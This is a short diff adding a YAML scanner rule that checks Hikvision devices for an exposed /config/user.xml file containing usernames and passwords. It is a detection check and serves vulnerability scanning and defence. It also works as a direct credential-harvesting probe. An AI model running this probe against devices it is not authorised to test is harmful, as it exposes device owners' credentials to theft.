@@ -1,0 +1,8 @@
+name: hikvision-userxml-info-disclosure
+rules:
+  - method: GET
+    path: "/config/user.xml"
+    expression: |
+      response.status == 200 && response.body.bcontains(b'name') && response.body.bcontains(b'password')
+detail:
+  author: 666
